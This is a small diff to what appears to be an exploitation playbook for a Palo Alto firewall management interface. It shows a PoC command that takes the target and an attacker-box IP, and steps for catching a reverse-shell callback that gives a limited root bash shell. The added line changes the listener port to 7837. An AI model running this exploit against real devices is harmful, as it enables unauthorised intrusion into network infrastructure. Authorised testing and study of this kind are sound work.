@@ -277,6 +277,7 @@ python PoC.py https://<ip_of_palo_management_interface> <ip_address_of_attack_bo
 
 3. Watch the initial listener pane to ensure it catches the callback from the exploit.
    If you see the following, you have successfully exploited the Palo Alto and now have a limited bash shell into the root of the system:
+   Note: Our listener port will be 7837, as specified earlier in the playbook. Not 9999 as pictured.
 
 ![image](https://github.com/user-attachments/assets/0d3b2d49-fe66-4dcb-80da-51204efebfbc)
 
